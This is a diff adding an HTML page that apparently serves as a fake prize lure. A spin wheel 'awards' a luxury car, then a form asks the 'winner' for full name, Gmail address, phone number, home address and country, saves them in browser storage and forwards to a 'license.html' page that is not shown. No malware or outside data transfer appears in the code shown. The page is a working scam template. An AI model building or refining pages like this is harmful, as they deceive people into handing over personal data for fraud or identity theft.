@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Spin Wheel</title>
+<style>
+body {
+  margin: 0;
+  background: #111;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  height: 100vh;
+  color: white;
+  font-family: Arial, sans-serif;
+}
+.wheel-container {
+  position: relative;
+  width: 350px;
+  height: 350px;
+}
+#wheel {
+  width: 100%;
+  height: 100%;
+  border-radius: 50%;
+  transition: transform 5s cubic-bezier(.17,.67,.12,.99);
+}
+.pointer-stick {
+  position: absolute;
+  top: -40px;
+  left: 50%;
+  transform: translateX(-50%);
+  width: 6px;
+  height: 60px;
+  background: gold;
+  border-radius: 3px;
+  z-index: 50;
+}
+#spinButton {
+  margin-top: 30px;
+  padding: 12px 25px;
+  background: gold;
+  border: none;
+  border-radius: 10px;
+  font-size: 18px;
+  cursor: pointer;
+  font-weight: bold;
+}
+#result {
+  margin-top: 20px;
+  font-size: 22px;
+  font-weight: bold;
+}
+/* Congratulations overlay */
+#congratsBox {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0,0,0,0.85);
+  display: none;
+  align-items: center;
+  justify-content: center;
+  flex-direction: column;
+  z-index: 200;
+  text-align: center;
+}
+#countdown {
+  font-size: 28px;
+  margin-top: 15px;
+}
+/* Form page */
+#formPage {
+  display: none;
+  flex-direction: column;
+  margin-top: 30px;
+  width: 90%;
+  max-width: 400px;
+}
+#formPage input, #formPage select {
+  padding: 10px;
+  margin: 8px 0;
+  border-radius: 6px;
+  border: none;
+  width: 100%;
+}
+#proceedBtn {
+  padding: 12px;
+  background: gold;
+  color: black;
+  border-radius: 8px;
+  border: none;
+  font-size: 18px;
+  margin-top: 15px;
+  cursor: pointer;
+}
+</style>
+</head>
+<body>
+
+<div class="wheel-container" id="wheelSection">
+    <img id="wheel" src="wheel.png" />
+    <div class="pointer-stick"></div>
+</div>
+
+<button id="spinButton">SPIN</button>
+<p id="result"></p>
+
+<!-- Congratulations Overlay -->
+<div id="congratsBox">
+    <h1>🎉 Congratulations! 🎉</h1>
+    <h2 id="wonText"></h2>
+    <p>Please wait...</p>
+    <div id="countdown">5</div>
+</div>
+
+<!-- Form Page -->
+<div id="formPage">
+    <h2>Enter Your Details to Claim Reward</h2>
+    <input type="text" id="fullName" placeholder="Full Name" />
+    <input type="email" id="email" placeholder="Sample: example@gmail.com" />
+    <input type="text" id="phone" placeholder="Phone Number (include +country code)" />
+    <input type="text" id="address" placeholder="Address" />
+    <select id="country">
+      <option value="">Select Country</option>
+      <option value="Canada">Canada</option>
+      <option value="USA">USA</option>
+      <option value="UK">UK</option>
+      <option value="Australia">Australia</option>
+      <option value="Other">Other</option>
+    </select>
+    <button id="proceedBtn">Submit & Proceed</button>
+</div>
+
+<script>
+const wheel = document.getElementById("wheel");
+const spinBtn = document.getElementById("spinButton");
+const result = document.getElementById("result");
+const congratsBox = document.getElementById("congratsBox");
+const wonText = document.getElementById("wonText");
+const countdown = document.getElementById("countdown");
+const wheelSection = document.getElementById("wheelSection");
+const formPage = document.getElementById("formPage");
+const proceedBtn = document.getElementById("proceedBtn");
+
+const items = ["Cybertruck","Lamborghini Urus","Audi","Rolls Royce","Mystery Box"];
+
+let spinning = false;
+
+// Spin Wheel Logic
+spinBtn.onclick = () => {
+   if(spinning) return;
+   spinning = true;
+
+   const randomSpin = 3600 + Math.floor(Math.random() * 360);
+   wheel.style.transform = `rotate(${randomSpin}deg)`;
+
+   setTimeout(() => {
+      const degree = (360 - (randomSpin % 360)) % 360;
+      const index = Math.floor(degree / 72) % items.length;
+      const prize = items[index];
+
+      result.innerHTML = "RESULT: " + prize;
+      wonText.innerHTML = `You won: ${prize}`;
+      congratsBox.style.display = "flex";
+      spinBtn.disabled = true;
+
+      let timeLeft = 5;
+      countdown.innerHTML = timeLeft;
+      const timer = setInterval(() => {
+         timeLeft--;
+         countdown.innerHTML = timeLeft;
+         if(timeLeft <= 0){
+            clearInterval(timer);
+            congratsBox.style.display = "none";
+            wheelSection.style.display = "none";
+            spinBtn.style.display = "none";
+            result.style.display = "none";
+            formPage.style.display = "flex";
+            // Save prize in localStorage for next pages
+            localStorage.setItem("prizeItem", prize);
+         }
+      },1000);
+
+      spinning = false;
+   },5000);
+};
+
+// Form Validation & Proceed
+proceedBtn.onclick = () => {
+   const fullName = document.getElementById("fullName").value.trim();
+   const email = document.getElementById("email").value.trim();
+   const phone = document.getElementById("phone").value.trim();
+   const address = document.getElementById("address").value.trim();
+   const country = document.getElementById("country").value;
+
+   // Gmail validation
+   const gmailPattern = /^[a-zA-Z0-9._%+-]+@gmail\.com$/;
+   if(!gmailPattern.test(email)){ 
+       alert("Please enter a valid Gmail address."); 
+       return; 
+   }
+
+   // Phone number validation: must start with + and 6–15 digits
+   const phonePattern = /^\+\d{6,15}$/;
+   if(!phonePattern.test(phone)){
+       alert("Phone number must start with +countrycode and contain only digits.");
+       return;
+   }
+
+   if(address === ""){ alert("Please enter your address."); return; }
+   if(country === ""){ alert("Please select your country."); return; }
+
+   // Save all details in localStorage
+   localStorage.setItem("fullName", fullName);
+   localStorage.setItem("email", email);
+   localStorage.setItem("phone", phone);
+   localStorage.setItem("address", address);
+   localStorage.setItem("country", country);
+
+   // Redirect to license page
+   window.location.href = "license.html";
+};
+</script>
+</body>
+</html>
